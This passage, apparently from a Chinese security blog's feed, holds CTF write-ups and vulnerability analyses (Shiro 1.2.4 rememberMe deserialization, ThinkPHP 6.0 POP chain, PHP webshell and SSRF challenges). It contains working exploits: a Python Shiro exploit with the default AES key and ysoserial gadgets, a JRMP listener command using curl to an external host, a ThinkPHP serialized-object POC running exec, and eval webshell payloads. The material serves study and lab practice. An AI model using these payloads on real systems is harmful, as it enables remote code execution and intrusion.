title="littlegame"></a>littlegame</h2><p>查看packge.json，发现set-value存在原型链污染 <a href="https://www.anquanke.com/vul/id/1715582">https://www.anquanke.com/vul/id/1715582</a></p><pre><code class="json">&#123; &quot;name&quot;: &quot;littlegame&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;private&quot;: true, &quot;scripts&quot;: &#123;  &quot;start&quot;: &quot;node ./bin/www&quot; &#125;, &quot;dependencies&quot;: &#123;  &quot;cookie-parser&quot;: &quot;~1.4.4&quot;,  &quot;debug&quot;: &quot;~2.6.9&quot;,  &quot;express&quot;: &quot;~4.16.1&quot;,  &quot;express-session&quot;: &quot;^1.17.1&quot;,  &quot;morgan&quot;: &quot;~1.9.1&quot;,  &quot;set-value&quot;: &quot;^3.0.0&quot; &#125;&#125;</code></pre><p>在index.js找到flag接口</p><pre><code class="js">const Admin = &#123;    &quot;password1&quot;:process.env.p1,    &quot;password2&quot;:process.env.p2,    &quot;password3&quot;:process.env.p3&#125;...router.post(&quot;/DeveloperControlPanel&quot;, function (req, res, next) &#123;  // not implement  if (req.body.key === undefined || req.body.password === undefined)&#123;    res.send(&quot;What&#39;s your problem?&quot;);  &#125;else &#123;    let key = req.body.key.toString();    let password = req.body.password.toString();    if(Admin[key] === password)&#123;      res.send(process.env.flag);    &#125;else &#123;      res.send(&quot;Wrong password!Are you Admin?&quot;);    &#125;  &#125;&#125;);...router.post(&quot;/Privilege&quot;, function (req, res, next) &#123;    // Why not ask witch for help?    if(req.session.knight === undefined)&#123;        res.redirect(&#39;/SpawnPoint&#39;);    &#125;else&#123;        if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) &#123;            res.send(&quot;What&#39;s your problem?&quot;);        &#125;else &#123;            let key = req.body.NewAttributeKey.toString();            let value = req.body.NewAttributeValue.toString();            setFn(req.session.knight, key, value);            res.send(&quot;Let&#39;s have a check!&quot;);        &#125;    &#125;&#125;);</code></pre><p>构造如下exp：</p><pre><code>http://eci-2ze2t1c804gx9bfude7s.cloudeci1.ichunqiu.com:8888/PrivilegePOST NewAttributeKey=__proto__.password4&amp;NewAttributeValue=tyaohttp://eci-2ze2t1c804gx9bfude7s.cloudeci1.ichunqiu.com:8888/DeveloperControlPanelPOST key=password4&amp;password=tyao</code></pre><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>参考<a href="https://blog.csdn.net/qq_45708109/article/details/107645816">https://blog.csdn.net/qq_45708109/article/details/107645816</a></p><p>可以绕过的函数有很多，这里使用hex2bin</p><pre><code class="php">// phpinfo?a=&#123;if:var_dump((hex2bin(%27706870696e666f%27))())&#125;Tyao&#123;end%20if&#125;// cat /flag?a=&#123;if:var_dump(((hex2bin(%2773797374656d%27))(%27cat%20/flag%27)))&#125;Tyao&#123;end%20if&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 1.2.4 反序列化链分析</title>
      <link href="/2020/08/01/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2020/08/01/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>git clone https://github.com/apache/shiro.git  cd shirogit checkout shiro-root-1.2.4  </code></pre><span id="more"></span><p>编辑<code>pom.xml</code>，添加如下jar包</p><pre><code class="xml">&lt;!--  需要设置编译的版本 --&gt;      &lt;properties&gt;       &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;       &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;   &lt;/properties&gt;...   &lt;dependencies&gt;       &lt;dependency&gt;           &lt;groupId&gt;javax.servlet&lt;/groupId&gt;           &lt;artifactId&gt;jstl&lt;/artifactId&gt;           &lt;!--  这里需要将jstl设置为1.2 --&gt;           &lt;version&gt;1.2&lt;/version&gt;            &lt;scope&gt;runtime&lt;/scope&gt;       &lt;/dependency&gt;.....       &lt;dependency&gt;           &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;           &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;           &lt;version&gt;4.0&lt;/version&gt;       &lt;/dependency&gt;&lt;dependencies&gt;  </code></pre><p>创建<code>~/.m2/toolchains.xml</code>文件，添加jdk1.6环境</p><pre><code class="xml">&lt;toolchains&gt;    &lt;toolchain&gt;      &lt;type&gt;jdk&lt;/type&gt;      &lt;provides&gt;        &lt;version&gt;1.6&lt;/version&gt;        &lt;vendor&gt;sun&lt;/vendor&gt;      &lt;/provides&gt;      &lt;configuration&gt;        &lt;jdkHome&gt;D:\Java\jdk1.6.0_45&lt;/jdkHome&gt;      &lt;/configuration&gt;    &lt;/toolchain&gt;&lt;/toolchains&gt;</code></pre><p>编译成war包</p><pre><code>cd shiro/samples/web  mvn package -D maven.skip.test=true</code></pre><p>把生成的<code>samples-web-1.2.4.war</code>放到Tomcat的webapps目录下，为了方便重命名为<code>shiro.war</code></p><p>启动tomcat，访问<code>http://127.0.0.1:8080/shiro/</code>，搭建完成</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223304.png" alt="image-20200728102626680"></p><h2 id="漏洞链分析"><a href="#漏洞链分析" class="headerlink" title="漏洞链分析"></a>漏洞链分析</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>因为漏洞出现在<code>Remember Me</code>，所以我们记得勾选，然后再进行登录</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223410.png" alt="image-20200731112027369"></p><p>在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> 处下个断点，传入的三个参数都包含了我们登陆的信息</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223420.png" alt="image-20200731112430152"></p><p>跟进<code>forgetIdentity</code>方法，它会对<code>subject</code>变量进行处理</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223426.png" alt="image-20200731112640520"></p><p>继续跟进<code>forgetIdentity</code>方法，我们会发现它主要是对<code>set-cookie</code>的一些处理</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223444.png" alt="image-20200731112808224"></p><p>继续跟进下一步，首先会判断我们有无设置<code>Remember Me</code>，如果有的话就会进入<code>rememberIdentity</code>函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223449.png" alt="image-20200731113121803"></p><p>继续跟进，也是对用户的登录信息进行处理</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223456.png" alt="image-20200731113634580"></p><p>我们可以看到他们把用户信息序列化之后，会进行加密</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223502.png" alt="image-20200731113733542"></p><p>这里是加密函数，这一步是获取加密所采取的方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223506.png" alt="image-20200731113853889"></p><p>观察本地变量，我们可以看到它加密的方法用的是AES的CBC方式</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223544.png" alt="image-20200731114018051"></p><p>数据加密主要发生在这一步</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731141144566"></p><p><code>getEncryptionCipherKey</code>函数是获得加密所需要的<code>Key</code>，因为传入的是空参数，所以采用的是默认的<code>Key</code>，这个是可以直接在源码找到的</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731142820956"></p><p>然后会将序列化好的数据进行AES加密</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731141442083"></p><p>加密完之后就会返回加密的结果</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223809.png" alt="image-20200731114416038"></p><p>后面会对返回后的加密值进行进一步处理</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223802.png" alt="image-20200731114450542"></p><p>是对序列化后的值进行<code>Base64</code>加密后存放在<code>Cookie</code>中</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731114542521"></p><p>整个登录过程大致为这样</p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>要想找到解密的入口位置，首先我们需要在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code> 下个断点</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223851.png" alt="image-20200731143126894"></p><p>这是我们得到的调用链，根据函数名字我们可以知道，<code>getRememberedIdentity</code>是获取<code>cookie</code>中的<code>rememberMe</code>进行解析，所以我们可以选择在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedIdentity</code>下一个断点</p><pre><code>1. decrypt:486, AbstractRememberMeManager (org.apache.shiro.mgt)2. convertBytesToPrincipals:429, AbstractRememberMeManager (org.apache.shiro.mgt)3. getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)4. getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</code></pre><p>然后我们跟进一下<code>getRememberedPrincipals</code>这个函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223933.png" alt="image-20200731152746429"></p><p>首先是是要得到<code>rememberMe</code>序列化后的值</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223939.png" alt="image-20200731153224590"></p><p>跟进以后可以看到是进行了<code>Base64.deocde</code>之后再返回序列化数据</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223946.png" alt="image-20200731153715075"></p><p>到<code>convertBytesToPrincipals</code>函数应该就是<code>AES</code>解密的操作了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224004.png" alt="image-20200731153843497"></p><p>继续跟进解密函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224011.png" alt="image-20200731153944948"></p><p>然后获取加解密服务类进行解密，使用的<code>key</code>依然是默认<code>key</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224024.png" alt="image-20200731154036729"></p><p>首先是获取解密需要的<code>iv</code>值，后面就是很正常的<code>AES</code>解密步骤了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224048.png" alt="image-20200731151402487"></p><p>之后返回解密后的序列化值</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224111.png" alt="image-20200731155653747"></p><p>然后就是最后一步的反序列化</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224118.png" alt="image-20200731161249665"></p><p>后面是就调用<code>readObject</code>函数进行反序列化了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224124.png" alt="image-20200731161543385"></p><p>按理来说到这里就可以直接操作get shell了，但是这里还有另外一个问题</p><p>在@orange和@zsx文章中提到</p><blockquote><p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p></blockquote><p>我们继续跟进<code>readObject</code>，我们会发现shiro重构了自己的<code>resolveClass</code>，这里使用的是<code>ClassUtils.forName</code></p><blockquote><p>而jdk原版的<code>resovleClass</code>是 <code>Class.forName</code> </p></blockquote><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224138.png" alt="image-20200731162304022"></p><p>跟进去发现其实底层是调用了<code>loadClass</code>函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224146.png" alt="image-20200731162553365"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写exp如下</p><pre><code class="python">import requests as rqimport subprocessimport base64import uuidfrom Crypto.Cipher import AESfrom random import Randomtarget = &#39;http://127.0.0.1:8080/shiro/&#39;dns_server = &#39;http://xxxxx.ceye.io&#39;use_jar = [&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;]cmd = &#39;touch /tmp/shiro.txt&#39;jrmp_server_ip = &#39;127.0.0.1&#39;jrmp_server_port = &#39;9999&#39;def self_cmd():    # user-defined cmd    popen = subprocess.Popen(use_jar + [&#39;CommonsCollections2&#39;, cmd], stdout=subprocess.PIPE)    payload = popen.stdout.read()    return payloaddef urldns():    # use URLDNS gadget    print(f&quot;[*] test dns_server:\n&#123;dns_server&#125;&quot;)    popen = subprocess.Popen(use_jar + [&#39;URLDNS&#39;, dns_server], stdout=subprocess.PIPE)    payload = popen.stdout.read()    return payloaddef jrmp():    # use JRMPClient gadget    # Server:     # java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 &#39;curl http://xxxxx.ceye.io&#39;    popen = subprocess.Popen(use_jar + [&#39;JRMPClient&#39;, f&quot;&#123;jrmp_server_ip&#125;:&#123;jrmp_server_port&#125;&quot;], stdout=subprocess.PIPE)    payload = popen.stdout.read()    return payloaddef exp(payload):    # AES encode    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;    mode = AES.MODE_CBC    iv = uuid.uuid4().bytes    encryptor = AES.new(base64.b64decode(key), mode, iv)    padding = pad(payload)    b64 = base64.b64encode(iv + encryptor.encrypt(padding)).decode()    try:        print(f&#39;[*] send payload:\n&#123;b64&#125;&#39;)        res = rq.get(target, cookies=&#123;&#39;rememberMe&#39;: b64&#125;)        print(f&#39;[*] send finished&#39;)        # print(f&quot;[*] response:\n&#123;res.text&#125;&quot;)    except Exception as e:        print(f&quot;[*] send failed:\n&#123;e&#125;&quot;)if __name__ == &quot;__main__&quot;:    # exp(self_cmd())    # exp(urldns())    exp(jrmp())</code></pre><blockquote><p>但是不知道为什么JRMP打不通，如果有师傅知道的可以指点一下</p></blockquote><p>推荐一个好用的工具：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>针对这个问题shiro解决了自带的硬编码的问题，当然如果用户还是用硬编码的方式，一旦key泄漏，一样是会造成反序列化的问题。</p><p>官方针对这个问题的修复方式：</p><p>1、删除相关默认密钥</p><p>2、如果没有配置密钥，会随机生成一个密钥。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/">http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p><p><a href="https://www.cnblogs.com/paperpen/p/11312671.html">https://www.cnblogs.com/paperpen/p/11312671.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6.0反序列漏洞分析</title>
      <link href="/2020/07/28/ThinkPHP6-0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/07/28/ThinkPHP6-0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>thinkphp 6.0.2</li><li>PHP 7.4.7</li></ul><span id="more"></span><p>修改index页面如下</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123;    public function poc()    &#123;        echo base64_decode($_POST[&#39;payload&#39;]);        unserialize(base64_decode($_POST[&#39;payload&#39;]));    &#125;&#125;</code></pre><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>全局搜索<code>__destruct</code>，找到Model模块的，满足<code>$this-&gt;lazySave == true</code>条件，进入代码[1]</p><pre><code class="php">// vendor/topthink/think-orm/src/Model.phppublic function __destruct()&#123;    if ($this-&gt;lazySave) &#123;        $this-&gt;save(); // 1    &#125;&#125;</code></pre><p>跟进<code>$this-&gt;save()</code>，满足<code>$this-&gt;isEmpty() == false &amp;&amp; $this-&gt;trigger(&#39;BeforeWrite&#39;) == true &amp;&amp; $this-&gt;exists == true</code>条件，其中<code>isEmpty</code>判断的是<code>data</code>是否为空，<code>trigger</code>函数满足<code>$this-&gt;withEvent == false</code>即可，接着可以进入代码[2]</p><pre><code class="php">// vendor/topthink/think-orm/src/Model.phppublic function save(array $data = [], string $sequence = null): bool&#123;    ...    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;        return false;    &#125;    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // 2    ...&#125;</code></pre><pre><code class="php">// vendor/topthink/think-orm/src/Model.phppublic function isEmpty(): bool&#123;    return empty($this-&gt;data);&#125;</code></pre><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/ModelEvent.phpprotected function trigger(string $event): bool&#123;    if (!$this-&gt;withEvent) &#123;        return true;    &#125;    ...&#125;</code></pre><p>跟进<code>$this-&gt;updateData()</code>，满足<code>$this-&gt;trigger(&#39;BeforeWrite&#39;) == true</code>条件，进入代码[3]</p><pre><code class="php">// vendor/topthink/think-orm/src/Model.phpprotected function updateData(): bool&#123;    // 事件回调    if (false === $this-&gt;trigger(&#39;BeforeUpdate&#39;)) &#123;        return false;    &#125;    $this-&gt;checkData();    // 获取有更新的数据    $data = $this-&gt;getChangedData(); // 3    if (empty($data)) &#123;        // 关联更新        if (!empty($this-&gt;relationWrite)) &#123;            $this-&gt;autoRelationUpdate();        &#125;        return true;    &#125;    if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123;        // 自动写入更新时间        $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);        $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];    &#125;    // 检查允许字段    $allowFields = $this-&gt;checkAllowFields(); // 4    ...&#125;</code></pre><p>跟进<code>$this-&gt;getChangedData()</code>，这里应该使<code>$this-&gt;force == true</code>，直接返回$data，否则会返回其他干扰值</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.phppublic function getChangedData(): array&#123;    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123;        if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123;            return 1;        &#125;        return is_object($a) || $a != $b ? 1 : 0;    &#125;);    ...    return $data;&#125;</code></pre><p>回到上一步，满足<code>empty($data) == false</code>条件进入代码[4]，跟进<code>$this-&gt;checkAllowFields()</code>，满足<code>empty($this-&gt;field) == true &amp;&amp; empty($this-&gt;schema) == true</code>条件，进入代码[5]</p><pre><code class="php">// vendor/topthink/think-orm/src/Model.phpprotected function checkAllowFields(): array&#123;    // 检测字段    if (empty($this-&gt;field)) &#123;        if (!empty($this-&gt;schema)) &#123;            $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));        &#125; else &#123;            $query = $this-&gt;db(); // 5            $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();            $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);        &#125;        return $this-&gt;field;    &#125;    ...&#125;</code></pre><p>跟进<code>$this-&gt;db()</code>，代码[6]处参数可控，可以触发<code>__toString()</code>函数</p><pre><code class="php">// vendor/topthink/think-orm/src/Model.phppublic function db($scope = []): Query&#123;    /** @var Query $query */    $query = self::$db-&gt;connect($this-&gt;connection)        -&gt;name($this-&gt;name . $this-&gt;suffix) // 6        -&gt;pk($this-&gt;pk);    ...&#125;</code></pre><blockquote><p>后面POP链与ThinkPHP5.1相同</p></blockquote><p>首先触发Conversion类中的<code>__toString()</code>方法</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Conversion.phppublic function toJson(int $options = JSON_UNESCAPED_UNICODE): string&#123;    return json_encode($this-&gt;toArray(), $options); // 8&#125;public function __toString()&#123;    return $this-&gt;toJson(); // 7&#125;</code></pre><p>跟进到<code>$this-&gt;toArray()</code>，最后我们的目标是调用<code>getAttr()</code>函数，但是代码[9]处的条件会被前面的代码修改，不可控，所以我们只能利用代码[10]</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Conversion.phppublic function toArray(): array&#123;    ...    foreach ($this-&gt;visible as $key =&gt; $val) &#123;            if (is_string($val)) &#123;                if (strpos($val, &#39;.&#39;)) &#123;                    [$relation, $name]          = explode(&#39;.&#39;, $val);                    $this-&gt;visible[$relation][] = $name;                &#125; else &#123;                    $this-&gt;visible[$val] = true;                    $hasVisible          = true;                &#125;                unset($this-&gt;visible[$key]);            &#125;        &#125;    ...    foreach ($data as $key =&gt; $val) &#123;        if ($val instanceof Model || $val instanceof ModelCollection) &#123;            // 关联模型对象            if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;                $val-&gt;visible($this-&gt;visible[$key]);            &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;                $val-&gt;hidden($this-&gt;hidden[$key]);            &#125;            // 关联模型对象            if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;                $item[$key] = $val-&gt;toArray();            &#125;        &#125; elseif (isset($this-&gt;visible[$key])) &#123;            $item[$key] = $this-&gt;getAttr($key); // 9        &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;            $item[$key] = $this-&gt;getAttr($key); // 10        &#125;    &#125;    ...&#125;</code></pre><p>跟进<code>$this-&gt;getAttr($key)</code>，我们可以在代码[11]插入任意命令</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.phppublic function getAttr(string $name)&#123;    try &#123;        $relation = false;        $value    = $this-&gt;getData($name); // 11    &#125; catch (InvalidArgumentException $e) &#123;        $relation = $this-&gt;isRelationAttr($name);        $value    = null;    &#125;    return $this-&gt;getValue($name, $value, $relation); // 13&#125;</code></pre><p>继续跟进<code>$this-&gt;getData($name)</code>，代码[12]那里我们要返回存储在<code>data</code>的命令参数</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.phppublic function getData(string $name = null)&#123;    if (is_null($name)) &#123;        return $this-&gt;data;    &#125;    $fieldName = $this-&gt;getRealFieldName($name);    if (array_key_exists($fieldName, $this-&gt;data)) &#123;        return $this-&gt;data[$fieldName]; // 12    &#125; elseif (array_key_exists($fieldName, $this-&gt;relation)) &#123;        return $this-&gt;relation[$fieldName];    &#125;    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);&#125;</code></pre><p>返回上一步继续跟进<code>$this-&gt;getValue($name, $value, $relation)</code>，在这里把代码[14]把存储在<code>withAttr</code>的命令参数赋值给<code>closure</code>，代码[15]即可进行RCE</p><pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.phpprotected function getValue(string $name, $value, $relation = false)&#123;    // 检测属性获取器    $fieldName = $this-&gt;getRealFieldName($name);    $method    = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;    if (isset($this-&gt;withAttr[$fieldName])) &#123;        if ($relation) &#123;            $value = $this-&gt;getRelationValue($relation);        &#125;        if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) &#123;            $value = $this-&gt;getJsonValue($fieldName, $value);        &#125; else &#123;            $closure = $this-&gt;withAttr[$fieldName]; // 14            $value   = $closure($value, $this-&gt;data); // 15        &#125;    &#125;     ...&#125;</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="php">&lt;?phpnamespace think;abstract class Model &#123;    private $lazySave = true;    private $exists = true;    protected $withEvent = false;    private $force = true;    protected $connection = &quot;mysql&quot;;    private $withAttr = [&quot;Tyaoo&quot;=&gt;&quot;exec&quot;]; // 系统命令    private $data = [&quot;Tyaoo&quot;=&gt;&quot;calc&quot;]; // 命令参数    protected $name;&#125;namespace think\model;use think\Model;class Pivot extends Model &#123;    function __construct() &#123;        $this-&gt;name = $this;    &#125;&#125;echo base64_encode(serialize(new Pivot()));</code></pre><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200727230224.png" alt="image-20200727230214642" style="zoom:67%;" /><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP6.0.2反序列化链分析/">http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP6.0.2反序列化链分析/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-GKCTF-WEB</title>
      <link href="/2020/05/28/2020-GKCTF-Web/"/>
      <url>/2020/05/28/2020-GKCTF-Web/</url>
      
        <content type="html"><![CDATA[<p>找了个时间复现了 GKCTF 的 WEB 题目</p><span id="more"></span><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p><p>进去给到源码，给了我们一个小马</p><pre><code class="php">&lt;?php highlight_file(__FILE__);class ClassName&#123;        public $code = null;        public $decode = null;        function __construct()        &#123;                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];                $this-&gt;decode = @base64_decode( $this-&gt;code );                @Eval($this-&gt;decode);        &#125;        public function x()        &#123;                return $_REQUEST;        &#125;&#125;new ClassName();</code></pre><p>先上一个小马</p><pre><code class="php">php &gt; echo base64_encode(&#39;eval($_REQUEST[kk]);&#39;);ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</code></pre><p>看看 phpinfo</p><pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</code></pre><p>绕 disable_functions</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p><p>蚁剑连上去，flag 需要 /readflag</p><p>可以直接用这个绕  <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p>上传到 /tmp 目录，直接包含就好</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png" alt=""></p><p>执行命令</p><pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p><p>exp 在这里 <a href="https://bugs.php.net/bug.php?id=79329">https://bugs.php.net/bug.php?id=79329</a></p><p>直接打就好，访问 127.0.0.1 返回 hint</p><pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p><h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p><p>参考 <a href="http://www.nctry.com/1660.html">http://www.nctry.com/1660.html</a> 后台getshell</p><p>我这里扔了一个冰蝎的马，连上读 /flag</p><p><img 